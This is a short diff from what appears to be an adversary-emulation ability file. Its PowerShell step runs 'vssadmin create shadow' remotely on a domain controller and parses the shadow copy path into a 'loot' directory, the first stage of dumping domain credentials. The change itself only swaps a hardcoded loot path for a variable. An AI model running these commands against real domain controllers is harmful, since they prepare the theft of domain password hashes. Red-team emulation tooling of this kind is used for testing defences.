@@ -14,7 +14,7 @@
       psh:
         command: |
           $dc = "#{domain.controller.hostname}"
-          $localLootDir = "C:\Users\Public\Loot"
+          $localLootDir = "#{env.dir.loot}"
           New-Item -Path $localLootDir -ItemType Directory -ErrorAction SilentlyContinue
           $vssOutput = Invoke-Command -ComputerName $dc -ScriptBlock { cmd /c 'vssadmin create shadow /for=C:' } | Out-String
           $vssOutput -match "(\\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\d+)"
